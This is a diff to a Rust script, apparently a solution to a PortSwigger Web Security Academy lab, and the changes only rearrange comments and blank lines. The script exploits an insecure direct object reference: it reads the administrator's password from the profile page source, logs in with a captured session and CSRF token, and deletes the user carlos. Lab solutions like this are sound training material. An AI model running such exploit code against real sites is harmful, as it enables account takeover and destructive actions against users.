@@ -36,12 +36,14 @@ use text_colorizer::Colorize;
 fn main() {
     // change this to your lab URL
     let url = "https://0a2f00c9041179a18123e1cc0010004e.web-security-academy.net";
+
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
-    // fetch administrator profile vi URL id parameter
     print!("{} ", "1. Fetching administrator profile page..".white());
     io::stdout().flush();
+
+    // fetch administrator profile vi URL id parameter
     let admin_profile = client
         .get(format!("{url}/my-account?id=administrator"))
         .send()
@@ -49,36 +51,43 @@ fn main() {
             "{}",
             "[!] Failed to fetch administrator profile".red()
         ));
-    println!("{}", "OK".green());
 
-    // extract the password from source code
+    println!("{}", "OK".green());
     print!("{} ", "2. Extracting password from source code..".white());
     io::stdout().flush();
+
+    // extract the password from source code
     let body = admin_profile.text().unwrap();
     let admin_pass = capture_pattern("name=password value='(.*)'", &body).expect(&format!(
         "{}",
         "[!] Failed to extract the admin password".red()
     ));
-    println!("{} => {}", "OK".green(), admin_pass.yellow());
 
-    // fetch login page to get valid session csrf token
+    println!("{} => {}", "OK".green(), admin_pass.yellow());
     print!(
         "{} ",
         "3. Fetching login page to get valid session and csrf token..".white()
     );
     io::stdout().flush();
+
+    // fetch login page to get valid session csrf token
     let get_login = client
         .get(format!("{url}/login"))
         .send()
         .expect(&format!("{}", "[!] Failed to fetch login page".red()));
+
+    // extract session cookie
     let session = extract_session_cookie(get_login.headers())
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
-    let csrf = extract_csrf(get_login).expect(&format!("{}", "[!] Failed extract csrf".red()));
-    println!("{}", "OK".green());
 
-    // login as admin
+    // extract csrf token
+    let csrf = extract_csrf(get_login).expect(&format!("{}", "[!] Failed extract csrf".red()));
+
+    println!("{}", "OK".green());
     print!("{} ", "4. Logging in as administrator..".white());
     io::stdout().flush();
+
+    // login as admin
     let login = client
         .post(format!("{url}/login"))
         .header("Cookie", format!("session={session}"))
@@ -89,22 +98,25 @@ fn main() {
         ]))
         .send()
         .expect(&format!("{}", "[!] Failed to login as admin".red()));
+
+    // extract session cookie
     let new_session = extract_session_cookie(login.headers()).expect(&format!(
         "{}",
         "[!] Failed to extract new session cookie".red()
     ));
-    println!("{}", "OK".green());
 
-    // delete carlos
+    println!("{}", "OK".green());
     print!("{} ", "5. Deleting carlos..".white());
     io::stdout().flush();
+
+    // delete carlos
     let delete_carlos = client
         .get(format!("{url}/admin/delete?username=carlos"))
         .header("Cookie", format!("session={new_session}"))
         .send()
         .expect(&format!("{}", "[!] Failed to delete carlos".red()));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     println!(
         "{} {}",
         "[#] Check your browser, it should be marked now as"
